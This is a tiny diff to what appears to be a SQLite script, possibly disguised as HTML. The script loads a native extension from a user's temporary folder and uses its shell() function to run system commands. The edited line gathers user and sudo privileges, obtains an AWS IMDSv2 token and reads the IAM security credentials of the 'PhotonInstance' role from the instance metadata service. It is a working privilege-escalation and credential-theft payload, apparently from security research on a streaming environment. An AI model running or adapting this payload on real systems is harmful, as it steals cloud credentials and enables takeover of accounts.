@@ -1,4 +1,4 @@
 -- <html>
 .load /home/as2-streaming-user/MyFiles/TemporaryFiles/extension
-select shell("curl -i -H 'X-aws-ec2-metadata-token: AQAEAMxusGBCKKhFcvs_zp13dd7wytq1KfHRgNus4I6mx2rNLVggWQ==' http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance");
+select shell("id;whoami;sudo -l;curl -i -H \"X-aws-ec2-metadata-token: `curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'`\" http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance");
   -- </html>
